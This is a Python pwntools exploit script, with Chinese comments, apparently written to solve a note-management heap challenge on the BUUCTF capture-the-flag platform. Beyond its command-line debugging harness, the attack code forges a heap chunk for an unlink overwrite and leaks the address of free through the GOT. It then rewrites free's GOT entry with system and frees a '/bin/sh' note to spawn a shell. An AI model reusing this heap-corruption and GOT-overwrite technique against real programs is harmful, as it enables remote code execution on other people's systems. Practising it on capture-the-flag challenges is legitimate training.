from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time
import functools
'''
本脚本为做buuctf上的pwn题所编写，利用click模块配置命令行参数，
能方便地进行本地调试和远程解题。
本地命令：
    python3 exp.py filename --tmux 1 --gdb-breakpoint 0x804802a
    即可开始本地调试,并且会断在地址或函数处 建议启动tmux。tmux是一个窗口管理神器！
远程命令：
    python3 exp.py filename -i 127.0.0.1 -p 22164
    可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。
'''

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function

    # change
    if PORT: # 远程下这些是需要关闭的
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    elif '0x' in GDB_BREAKPOINT:
        gdb.attach(io, gdbscript='b *{}\nc\n'.format(GDB_BREAKPOINT))
    else:
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        print("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        print("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1
    pause()

# 定义int16
int16 = functools.partial(int, base=16)

def time_count(func):
    '''
    定义统计函数运行时间的装饰器
    '''
    @functools.wraps(func)
    def wrapper(*args, **kw):
        print('=' * 50)
        print('function #{}# start...'.format(func.__name__))
        start = time.time()
        res = func(*args, **kw)
        end = time.time()
        print('function #{}# end...execute time: {} s / {} min'.format(func.__name__, end - start, (end - start) / 60))
    return wrapper

    
context.update(log_level=PWN_LOG_LEVEL)

# 一般需要带上文件
assert FILENAME is not None, 'give me a file!'
##########################################
##############以下为攻击代码###############
##########################################
context.update(arch='amd64', endian='little', os='linux')

def new_note(length:int, content:bytes=b'\x00') -> int:
    global io
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:(less than 128)\n", str(length))
    io.sendlineafter("Input the note content:\n", content)
    msg = io.recvline()
    get_id = msg[28:-1]
    log.success("id:{}".format(get_id))
    return int(get_id.decode())


def show_note(idx:int):
    global io
    io.sendlineafter('option--->>\n', '2')
    io.sendlineafter("Input the id of the note:\n", str(idx))
    msg = io.recvline()
    log.success('msg recv:{}'.format(msg))
    return msg


def edit_note(idx:int, choose:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id of the note:\n", str(idx))
    io.sendlineafter("do you want to overwrite or append?[1.overwrite/2.append]\n", str(choose))
    io.sendlineafter('TheNewContents:', content)
    io.recvuntil("Edit note success!\n")


def delete_note(idx:int):
    global io
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id of the note:\n", str(idx))
    io.recvuntil("delete note success!\n")



io.sendlineafter("Input your name:\n", 'chenhuan')
io.sendlineafter("Input your address:\n", 'langshi')

tar_addr = 0x602120

i1 = new_note(0x30, p64(0) + p64(0x51) + p64(tar_addr - 0x18) + p64(tar_addr - 0x10))
i2 = new_note(0x0)
i3 = new_note(0x80)
new_note(0x10, b'/bin/sh\x00')

payload = b'\x50' * 0x18+ b'\x90'
edit_note(i2, 1, payload)

for x in range(0x17, 0x10, -1):
    payload = b'\x50' * x
    edit_note(i2, 1, payload)

delete_note(i3)

edit_note(i1, 1, b'a' * 0x18 + p64(cur_elf.got['free']))

msg = show_note(i1)
free_addr = u64(msg[11:-1].ljust(8, b'\x00'))
system_addr = free_addr - 0x3f1a0

if not DEBUG:
    system_addr = free_addr - 0x3f160

LOG_ADDR('free_addr', free_addr)

edit_note(i1, 1, p64(system_addr))


io.sendlineafter('option--->>\n', '4')
io.sendlineafter("Input the id of the note:\n", str(3))

io.interactive()



